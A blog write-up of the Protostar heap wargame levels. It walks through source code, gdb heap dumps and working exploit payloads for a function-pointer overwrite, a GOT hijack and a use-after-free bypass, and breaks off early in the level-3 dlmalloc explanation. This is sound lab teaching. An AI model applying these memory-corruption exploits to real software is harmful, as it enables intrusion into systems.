---
title: "Protostar - Heap"
description: "Writeup for Protostar Heap"
pubDate: "March 19 2025"
image: /image/blog-cover/heap.jpg
categories:
  - tech
tags:
  - Wargame
  - Pwnable
---

Heap challenges gave me a really hard time. They're some of the trickiest ones I've come across, but digging into them was totally worth it, especially the last challenge (Heap 3). That one completely changed how I see the heap, thanks to Doug Lea's malloc (dlmalloc).

After a lot of trial and error, rereading explanations, and testing different approaches, things finally started to make sense. And let me tell you, that "aha" moment was totally worth it!

There are already tons of great resources on heap exploitation, but I'm writing this to solidify what I've learned and share some cool insights along the way. Hope you enjoy it! ❤️

## Heap 0

Description:

>This level introduces heap overflows and how they can influence code flow.<br>
>This level is at /opt/protostar/bin/heap0

Source code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);
  
  f->fp();

}
```

This level is our first step into **heap overflows**! Looking at the code, it's pretty similar to the early **buffer overflow** challenges in the Protostar series. The main issue here is in **strcpy()**, where it doesn't check the size of the input, so we can overwrite data beyond its intended boundary.

In this case, we can take advantage of this bug to overwrite the function pointer **fp** and redirect execution to **winner()** instead of **nowinner()**.

### Basic Heap Layout

Before diving into the analysis, I’ll first provide a quick representation of how the heap looks, which will help us understand it better:

```shell
            malloc(8) = 0x804a08
memory

0x804a00 |	...	 |  0x11  |  4 bytes  |  4 bytes
0x804a10 |	...	 |  0x11  |  4 bytes  |  4 bytes
0x804a20 |	...	 |  0x11  |  4 bytes  |  4 bytes
```

This gives a quick view of what happens when `malloc()` is called. It allocates an 8-byte chunk on the heap and returns an address pointing to where our data starts.

If you look right before our data, you'll see **0x11**. This value represents the **chunk size**, meaning our chunk is actually 16 bytes (0x10 in hex). 

But why does it show **0x11 (0b10001)** instead of **0x10**? The last bit is set, what does that mean?

- This last bit is called `PREV_INUSE`. For the **first chunk** in the heap, this bit is always set, even though there’s no previous chunk. It just marks ***the first chunk as in use***.

- For all **other chunks**, `PREV_INUSE` tells whether the previous chunk is allocated. If it's set, the previous chunk is in use. If not, the previous chunk is free, and the heap can merge them (in case of `free()`).

Now, how do we find the next chunk when the second `malloc()` is called? Here's how:

$$
0x804a00 + 0x10 = 0x804a10
$$

We take the actual starting address of the current chunk and add its size. This leads us to the next chunk's address, where its metadata begins. The user data for the new chunk starts right after that metadata.

### Analysis

Now that we have a general understanding of the heap layout, the following analysis will make more sense.

First, I will debug the program in `gdb`, run it with a recognizable payload (AAAABBBBCCCCDDDD), set a breakpoint after the `strcpy()`, and determine the starting address of the heap using `info proc map`.

```shell
user@protostar:/opt/protostar/bin$ gdb ./heap0
(gdb) set disassembly-flavor intel
(gdb) set pagination off
(gdb) disassemble main
...
0x080484f2 <main+102>:  call   0x8048368 <strcpy@plt>
0x080484f7 <main+107>:  mov    eax,DWORD PTR [esp+0x1c]
0x080484fb <main+111>:  mov    eax,DWORD PTR [eax]
0x080484fd <main+113>:  call   eax
0x080484ff <main+115>:  leave
0x08048500 <main+116>:  ret
End of assembler dump.
(gdb) break *0x080484f7
Breakpoint 1 at 0x80484f7: file heap0/heap0.c, line 38.
(gdb) r AAAABBBBCCCCDDDD
Starting program: /opt/protostar/bin/heap0 AAAABBBBCCCCDDDD
data is at 0x804a008, fp is at 0x804a050
...
(gdb) info proc map
process 2402
cmdline = '/opt/protostar/bin/heap0'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/heap0'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/heap0
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/heap0
         0x804a000  0x806b000    0x21000          0           [heap]
...
```

From this, we can see that our heap starts at **0x804a000**. Next, let’s rerun the program and inspect how the data is stored in the heap:

```shell
(gdb) x/56wx 0x804a000
0x804a000:      0x00000000      0x00000049      0x41414141      0x42424242
0x804a010:      0x43434343      0x44444444      0x00000000      0x00000000
0x804a020:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a040:      0x00000000      0x00000000      0x00000000      0x00000011
0x804a050:      0x08048478      0x00000000      0x00000000      0x00020fa9
0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a070:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0d0:      0x00000000      0x00000000      0x00000000      0x00000000
```

From the heap layout above, we can observe two allocated chunks:
- The first chunk has a size of **0x48**, with user data starting at **0x804a008**.
- The second chunk has a size of **0x10**, with user data starting at **0x804a050**.

If we look closely at the second chunk, we can see that the address of `nowinner()` is stored on the heap. 

```shell
(gdb) x nowinner
0x8048478 <nowinner>:   0x83e58955
```

This means that if we create a payload that overwrites `nowinner()` with `winner()`, we can successfully exploit the vulnerability and complete this level!

Here is the address of **winner()**:

```shell
(gdb) x winner
0x8048464 <winner>:     0x83e58955
```

### Solution

Building upon our heap analysis, we can now create the appropriate payload to exploit the vulnerability.

From our inspection of the heap layout, we determined that the second chunk contains a function pointer that we need to overwrite. To do this, we first calculate the offset between the start of the first and second heap chunks' user data:

$$
0x804a050 - 0x804a008 = 72
$$

Thus, our padding must be **72 bytes long**. We also identified that the `winner()` function is located at **0x8048464**.

Now, we construct our exploit payload:

```python
import struct

padding = "A" * 72
winner = struct.pack("I", 0x8048464)

print padding + winner
```

Finally, executing the script gives us control over the function pointer:

```shell
user@protostar:~$ /opt/protostar/bin/heap0 $(python script.py)
data is at 0x804a008, fp is at 0x804a050
level passed
```

## Heap 1

Description:

>This level takes a look at code flow hijacking in data overwrite cases.<br>
>This level is at /opt/protostar/bin/heap1

Source code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```

### Analysis

In this program, we see that there are two allocated `internet` struct. Each `internet` struct contains an integer and a pointer to char. In C, a pointer to char is actually a string, meaning this pointer will point to another location on the heap.

Furthermore, there is a vulnerability where **strcpy()** is used. This function copies input from the program arguments, but there is no boundary check on the length of our input. Because of this, we can overflow data on the heap.

There is also a call to **printf()**, which brings up the concept of the ***Global Offset Table (GOT)***. We can overwrite a **GOT entry** and redirect execution to our **winner()** function.

At this point, you might think how can we overwrite **the GOT entry**?

The answer is simple. We need a ***pointer*** that we can manipulate to change data. If we look closely, the program uses `i1->name` and `i2->name`. Since `name` is a pointer, **strcpy()** must dereference it before writing data. This gives us a way to control **what and where gets written**.

The plan is to provide two arguments:

1. The first argument must be large enough to overflow the address stored in `i2->name`.
2. The second argument will be the address of the **winner()** function.

When the second **strcpy()** runs, it will use the modified `i2->name` pointer to overwrite the ***GOT entry of puts()*** with the address of **winner()**.

### Solution

As usual, I will debug the program with `gdb`, set the syntax to Intel and turn off the pagination. We first disassemble **main**.

```shell
user@protostar:/opt/protostar/bin$ gdb ./heap1
(gdb) set disassembly-flavor intel
(gdb) set pagination off
(gdb) disassemble main
...
0x08048561 <main+168>:  call   0x80483cc <puts@plt>
0x08048566 <main+173>:  leave
0x08048567 <main+174>:  ret
End of assembler dump.
```

The printf has become a puts. `plt` stands for **Procedure Linkage Table (PLT)**, which helps dynamic loading and linking easier to use. `@plt` suffix indicates we are calling **puts()** at its PLT entry located at `0x80483cc`. Let's disassemble this address:

```shell
(gdb) disassemble 0x80483cc
Dump of assembler code for function puts@plt:
0x080483cc <puts@plt+0>:        jmp    DWORD PTR ds:0x8049774
0x080483d2 <puts@plt+6>:        push   0x30
0x080483d7 <puts@plt+11>:       jmp    0x804835c
End of assembler dump.
```

This function calls another address: `0x8049774`. This is part of the **Global Offset Table (GOT)**, which points to the dynamically linked library that contains the actual **puts()** function.

```shell
(gdb) x 0x8049774
0x8049774 <_GLOBAL_OFFSET_TABLE_+36>:   0x080483d2
```

Our goal is to replace the call to **puts()** with a call to **winner()**. To do this, we need to overwrite the content at `0x8049774` in the **GOT**, currently holding `0x080483d2`, with the address of **winner()**.

Let's find the address of **winner()** using `objdump`.

```shell
user@protostar:/opt/protostar/bin$ objdump -t ./heap1 | grep winner
08048494 g     F .text  00000025              winner
```

Now that we have both the address of **winner()** and **the GOT entry**, we need to find the padding required to overflow into `i2->name`.

To do this, we will run the program with recognizable data (AAAA and BBBB) as arguments. We'll set a breakpoint right after the last call to **strcpy()**, at `0x0804855a`, then examine the heap.

```shell
(gdb) disassemble main
...
0x08048555 <main+156>:  call   0x804838c <strcpy@plt>
0x0804855a <main+161>:  mov    DWORD PTR [esp],0x804864b
0x08048561 <main+168>:  call   0x80483cc <puts@plt>
0x08048566 <main+173>:  leave
0x08048567 <main+174>:  ret
End of assembler dump.
(gdb) break *0x0804855a
Breakpoint 1 at 0x804855a: file heap1/heap1.c, line 34.
(gdb) r AAAA BBBB
Starting program: /opt/protostar/bin/heap1 AAAA BBBB

Breakpoint 1, main (argc=3, argv=0xbffff844) at heap1/heap1.c:34
(gdb) info proc map
process 2036
cmdline = '/opt/protostar/bin/heap1'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/heap1'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/heap1
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/heap1
         0x804a000  0x806b000    0x21000          0           [heap]
...
(gdb) x/56wx 0x804a000
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
0x804a010:      0x00000000      0x00000011      0x41414141      0x00000000
0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038
0x804a030:      0x00000000      0x00000011      0x42424242      0x00000000
0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000
0x804a050:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a070:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0d0:      0x00000000      0x00000000      0x00000000      0x00000000
```

From the heap dump, the address stored in `i2->name` is at `0x804a02c`, and **the first strcpy()** starts copying data from `0x804a018`.

Let's calculate the padding required for the first argument:

$$
0x804a02c - 0x804a018 = 20
$$

The second argument is the address of **winner()**, which is `0x8048494`.

Now, we have all the information needed to craft our exploit. Here is the final payload:

```shell
user@protostar:/opt/protostar/bin$ ./heap1 $(python -c 'print "A"*20 + "\x74\x97\x04\x08"') $(python -c 'print "\x94\x84\x04\x08"')
and we have a winner @ 1742201013
```

## Heap 2

Description:

>This level examines what can happen when heap pointers are stale.<br>
>This level is completed when you see the ***“you have logged in already!”*** message<br>
>This level is at /opt/protostar/bin/heap2

Source code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv)
{
  char line[128];

  while(1) {
    printf("[ auth = %p, service = %p ]\n", auth, service);

    if(fgets(line, sizeof(line), stdin) == NULL) break;
    
    if(strncmp(line, "auth ", 5) == 0) {
      auth = malloc(sizeof(auth));
      memset(auth, 0, sizeof(auth));
      if(strlen(line + 5) < 31) {
        strcpy(auth->name, line + 5);
      }
    }
    if(strncmp(line, "reset", 5) == 0) {
      free(auth);
    }
    if(strncmp(line, "service", 6) == 0) {
      service = strdup(line + 7);
    }
    if(strncmp(line, "login", 5) == 0) {
      if(auth->auth) {
        printf("you have logged in already!\n");
      } else {
        printf("please enter your password\n");
      }
    }
  }
}
```

### Analysis

The program is a login service that reads input from `stdin`. Our goal is to make it print "you have logged in already!"

We can use the following commands: `auth`, `reset`, `service`, and `login`.

```shell
user@protostar:/opt/protostar/bin$ ./heap2
[ auth = (nil), service = (nil) ]
auth AAAA
[ auth = 0x804c008, service = (nil) ]
reset
[ auth = 0x804c008, service = (nil) ]
service BBBB
[ auth = 0x804c008, service = 0x804c008 ]
login
please enter your password
[ auth = 0x804c008, service = 0x804c008 ]
```

When we run `reset`, it frees the allocated memory, but the `auth` pointer still holds the same address. When `login` runs, it accesses this freed memory with `auth->auth`.

The `service` command uses **strdup()**, which allocates new memory using `malloc()`. According to the `man` page:

>The strdup() function returns a pointer to a new string which is a duplicate of the string s. Memory for the new string is obtained with malloc(3), and can be freed with free(3).

This bug is a ***Use-After-Free (UAF)*** vulnerability. If we can overwrite `auth->auth` with value other than zero, we can exploit this issue.

Let's see how the heap looks like in `gdb`. As usual, I will use the Intel syntax, turn pagination off, and find the base address of the heap by using `info proc map`.

```shell
user@protostar:/opt/protostar/bin$ gdb ./heap2
(gdb) set disassembly-flavor intel
(gdb) set pagination off
(gdb) r
Starting program: /opt/protostar/bin/heap2
[ auth = (nil), service = (nil) ]
auth AAAA
[ auth = 0x804c008, service = (nil) ]
^C
Program received signal SIGINT, Interrupt.
0xb7f53c1e in __read_nocancel () at ../sysdeps/unix/syscall-template.S:82
82      ../sysdeps/unix/syscall-template.S: No such file or directory.
        in ../sysdeps/unix/syscall-template.S
Current language:  auto
The current source language is "auto; currently asm".
(gdb) info proc map
process 1705
cmdline = '/opt/protostar/bin/heap2'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/heap2'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x804b000     0x3000          0       /opt/protostar/bin/heap2
         0x804b000  0x804c000     0x1000     0x3000       /opt/protostar/bin/heap2
         0x804c000  0x804d000     0x1000          0           [heap]
...
```

The start address of our heap is `0x804c000`. Now then I will create a setup in `gdb` to make my "life" easier. I will first add a breakpoint right at the call to **printf()**. Since **auth** and **service** are the global variables, I can use their tags to print its content. Morever, I also use `command` in `gdb` to inspect the heap and the two afore-mentioned variables.

```shell
(gdb) disassemble main
Dump of assembler code for function main:
0x08048934 <main+0>:    push   ebp
0x08048935 <main+1>:    mov    ebp,esp
0x08048937 <main+3>:    and    esp,0xfffffff0
0x0804893a <main+6>:    sub    esp,0x90
0x08048940 <main+12>:   jmp    0x8048943 <main+15>
0x08048942 <main+14>:   nop
0x08048943 <main+15>:   mov    ecx,DWORD PTR ds:0x804b5f8
0x08048949 <main+21>:   mov    edx,DWORD PTR ds:0x804b5f4
0x0804894f <main+27>:   mov    eax,0x804ad70
0x08048954 <main+32>:   mov    DWORD PTR [esp+0x8],ecx
0x08048958 <main+36>:   mov    DWORD PTR [esp+0x4],edx
0x0804895c <main+40>:   mov    DWORD PTR [esp],eax
0x0804895f <main+43>:   call   0x804881c <printf@plt>
...
End of assembler dump.
(gdb) break *0x0804895f
Breakpoint 1 at 0x804895f: file heap2/heap2.c, line 20.
(gdb) command
Type commands for when breakpoint 1 is hit, one per line.
End with a line saying just "end".
>x/56wx 0x804c000
>echo ----------auth------------------------------------------------------------------\n
>print *auth
>echo ----------service---------------------------------------------------------------\n
>print service
>continue
>end
```

Everything is ready! Let's rerun the program.

```shell
(gdb) r
Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffff864) at heap2/heap2.c:20
20      in heap2/heap2.c
0x804c000:      Cannot access memory at address 0x804c000
(gdb) c
Continuing.
[ auth = (nil), service = (nil) ]
auth AAAA

Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffff864) at heap2/heap2.c:20
20      in heap2/heap2.c
0x804c000:      0x00000000      0x00000011      0x41414141      0x0000000a
0x804c010:      0x00000000      0x00000ff1      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0d0:      0x00000000      0x00000000      0x00000000      0x00000000
----------auth------------------------------------------------------------------
$5 = {name = "AAAA\n\000\000\000\000\000\000\000\361\017", '\000' <repeats 17 times>, auth = 0}
----------service---------------------------------------------------------------
$6 = 0x0
[ auth = 0x804c008, service = (nil) ]
```

Here, we use the `auth` command to allocate memory for our input (AAAA), but if you looks closely from the heap at `0x804c004`, this is the **size field** of our heap chunk, which indicates the size of the allocated chunk. The last bit of this field is used to determine **if the previous is free**. If it is the **first chunk**, then the last bit indicates that ***this chunk is in used***. 

But why does it contain the value **0x11** instead of **0x25** (the expected size of our `auth` struct)?

The issue comes from the variable name itself. Since the struct is also named **auth**, and there exists a global variable with the same name, calling `sizeof(auth)` actually **returns the size of the pointer auth** (4 bytes) instead of `sizeof(struct auth)`.

![faulty-variable-name](/image/protostar-heap/faulty-variable-name-heap2.png)

But this is not a major problem! When we use `login` command, it always references `auth->auth`, which translates to `auth + 32`. Also, we know that the `reset` command introduces a **Use-After-Free (UAF)** bug, causing **auth** to point to deallocated memory. 

With this in mind, we can exploit heap overflow using the `service` command, which allocates a new string on the heap. By using the `reset` command, we can control where this new string is stored, as the freed chunk is placed in the **fast bin**. 

Our objective here is to overflow the heap until we successfully overwrite the `auth` variable inside the struct, which is located **0x20 (32 in decimal)** bytes away from the **name** property.

A crucial detail to note is that the chunk size is **0x11**, meaning our input for the `service` command should be precisely **7 bytes long**. This requirement arises from `strdup(line + 7)`, which copies the input starting at the 7th byte, including the space character (0x20 in hex).

```shell
[ auth = 0x804c008, service = (nil) ]
reset

Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffff864) at heap2/heap2.c:20
20      in heap2/heap2.c
0x804c000:      0x00000000      0x00000011      0x00000000      0x0000000a
0x804c010:      0x00000000      0x00000ff1      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0d0:      0x00000000      0x00000000      0x00000000      0x00000000
----------auth------------------------------------------------------------------
$39 = {name = "\000\000\000\000\n\000\000\000\000\000\000\000\361\017", '\000' <repeats 17 times>, auth = 0}
----------service---------------------------------------------------------------
$40 = 0x0
[ auth = 0x804c008, service = (nil) ]
service AAAAAAA

Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffff864) at heap2/heap2.c:20
20      in heap2/heap2.c
0x804c000:      0x00000000      0x00000011      0x41414120      0x41414141
0x804c010:      0x0000000a      0x00000ff1      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0d0:      0x00000000      0x00000000      0x00000000      0x00000000
----------auth------------------------------------------------------------------
$41 = {name = " AAAAAAA\n\000\000\000\361\017", '\000' <repeats 17 times>, auth = 0}
----------service---------------------------------------------------------------
$42 = 0x804c008 " AAAAAAA\n"
[ auth = 0x804c008, service = 0x804c008 ]
service BBBBBBB

Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffff864) at heap2/heap2.c:20
20      in heap2/heap2.c
0x804c000:      0x00000000      0x00000011      0x41414120      0x41414141
0x804c010:      0x0000000a      0x00000011      0x42424220      0x42424242
0x804c020:      0x0000000a      0x00000fe1      0x00000000      0x00000000
0x804c030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0d0:      0x00000000      0x00000000      0x00000000      0x00000000
----------auth------------------------------------------------------------------
$43 = {name = " AAAAAAA\n\000\000\000\021\000\000\000 BBBBBBB\n\000\000\000\341\017\000", auth = 0}
----------service---------------------------------------------------------------
$44 = 0x804c018 " BBBBBBB\n"
[ auth = 0x804c008, service = 0x804c018 ]
service CCCCCCC

Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffff864) at heap2/heap2.c:20
20      in heap2/heap2.c
0x804c000:      0x00000000      0x00000011      0x41414120      0x41414141
0x804c010:      0x0000000a      0x00000011      0x42424220      0x42424242
0x804c020:      0x0000000a      0x00000011      0x43434320      0x43434343
0x804c030:      0x0000000a      0x00000fd1      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0d0:      0x00000000      0x00000000      0x00000000      0x00000000
----------auth------------------------------------------------------------------
$45 = {name = " AAAAAAA\n\000\000\000\021\000\000\000 BBBBBBB\n\000\000\000\021\000\000", auth = 1128481568}
----------service---------------------------------------------------------------
$46 = 0x804c028 " CCCCCCC\n"
[ auth = 0x804c008, service = 0x804c028 ]
```

As you can see, we have successfully overwritten the **auth->auth**, now if we trigger the `login` command, we will get the successful string.

```shell
[ auth = 0x804c008, service = 0x804c028 ]
login
you have logged in already!

Breakpoint 1, 0x0804895f in main (argc=1, argv=0xbffff864) at heap2/heap2.c:20
20      in heap2/heap2.c
0x804c000:      0x00000000      0x00000011      0x41414120      0x41414141
0x804c010:      0x0000000a      0x00000011      0x42424220      0x42424242
0x804c020:      0x0000000a      0x00000011      0x43434320      0x43434343
0x804c030:      0x0000000a      0x00000fd1      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0d0:      0x00000000      0x00000000      0x00000000      0x00000000
----------auth------------------------------------------------------------------
$11 = {name = " AAAAAAA\n\000\000\000\021\000\000\000 BBBBBBB\n\000\000\000\021\000\000", auth = 1128481568}
----------service---------------------------------------------------------------
$12 = 0x804c028 " CCCCCCC\n"
[ auth = 0x804c008, service = 0x804c028 ]
```

### Solution

Based on the analysis above, the solution for this level can be crafted as follows:

```shell
user@protostar:/opt/protostar/bin$ ./heap2
[ auth = (nil), service = (nil) ]
auth AAAA
[ auth = 0x804c008, service = (nil) ]
reset
[ auth = 0x804c008, service = (nil) ]
service AAAAAAA
[ auth = 0x804c008, service = 0x804c008 ]
service BBBBBBB
[ auth = 0x804c008, service = 0x804c018 ]
service CCCCCCC
[ auth = 0x804c008, service = 0x804c028 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c028 ]
```

## Heap 3

Description:

>This level introduces the Doug Lea Malloc (dlmalloc) and how heap meta data can be modified to change program execution.<br>
>This level is at /opt/protostar/bin/heap3

Source code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  char *a, *b, *c;

  a = malloc(32);
  b = malloc(32);
  c = malloc(32);

  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);

  free(c);
  free(b);
  free(a);

  printf("dynamite failed?\n");
}
```

The source code is simple and easy to follow. There are two functions: `main` and `winner`. The program uses three character pointers, dynamically allocates memory three times ***(malloc)***, copies strings into that memory three times ***(strcpy)***, then frees the memory three times ***(free)***, and finally calls ***printf***. The main objective is to redirect program execution to the `winner` function.

### Understanding dlmalloc

This type of vulnerability is linked to ***Doug Lea's malloc (dlmalloc)***, an old memory allocator. I’m working with <a href="https://gist.github.com/dathwang/89a6b012828ed26f6cb2a7961908d333" target="_blank">a version from 2001</a>, which means it contains some well-known weaknesses.

Before diving deeper, it's helpful to refer to an article from Phrack titled <a href="https://phrack.org/issues/57/9#article" target="_blank">"Once upon a free()"</a>, which explains the heap structure in a general way:

>Most malloc implementations share the behaviour of storing their own
management information, such as lists of used or free blocks, sizes of
memory blocks and other useful data within the heap space itself.<br><br>
>The central attack of exploiting malloc allocated buffer overflows is to
modify this management information in a way that will allow arbitrary
memory overwrites afterwards.

Here is how an allocated chunk looks like:

```
    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |       prev_size                 | |
            |       (if allocated)            | |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |       size                      |P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |       data                        .
            .                                   .
            .       (malloc_usable_space())     .
            .                                   |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |       prev_size ...               |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

Since all challenges from Protostar are **32-bit x86 architecture**, `prev_size` and `size` are 4 bytes each. `data` is the user data section. `malloc()` returns a pointer to the address where `data` starts. Furthermore, **the lowest bit of size (P)** called `PREV_INUSE` indicates whether the previous chunk is used or not.

Once we call `free(mem)`, the memory is released. If the chunks next to it are still being used, **dlmalloc** will remove a special flag called `PREV_INUSE` from the next chunk and link our freed chunk to a doubly-linked list of other free chunks. It does this by storing two pointers at `mem`: one pointing forward to the next free chunk and one pointing backward to the previous free chunk.

```
    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |       prev_size                 |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `head:' |       size                    |P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |       fd                        |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |       bk                        |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |       Unused space              .
            .       (may be 0 bytes long)     .
            .                                 .
            .                                 |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `foot:' |       prev_size ...             |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

If the forward and backward chunks are also free, `dlmalloc` will merge them together. First, `dlmalloc` takes the free chunk at lower address and combines it with the newly freed chunk (backward consolidation). Then, it does the same thing for the free chunk at higher address (forward consolidation).

To do this, it uses **unlink** macro, which removes chunk from the list and reconnects the remaining chunks.

```c
/* Take a chunk off a bin list */
